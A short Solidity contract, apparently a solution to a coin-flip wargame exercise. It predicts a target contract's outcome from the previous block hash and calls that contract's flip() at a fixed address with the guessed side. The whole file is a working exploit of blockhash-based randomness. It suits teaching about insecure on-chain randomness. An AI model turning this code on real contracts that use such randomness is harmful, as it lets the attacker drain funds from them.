// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface CoinFlip{
    function flip(
        bool swapEnabledOnStart
    ) external returns (bool);
}

contract CoinFlipExercise  {
    address public constant CoinFlipContract = address(0x813dAf356B18D2b55bF9a75880edfbcAA9C5817a);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 lastHash;

    function submitCoinFlip() public returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == true) {
            CoinFlip(CoinFlipContract).flip(true);
            return true;
        } else {
            CoinFlip(CoinFlipContract).flip(false);
            return false;
        }
    }
}
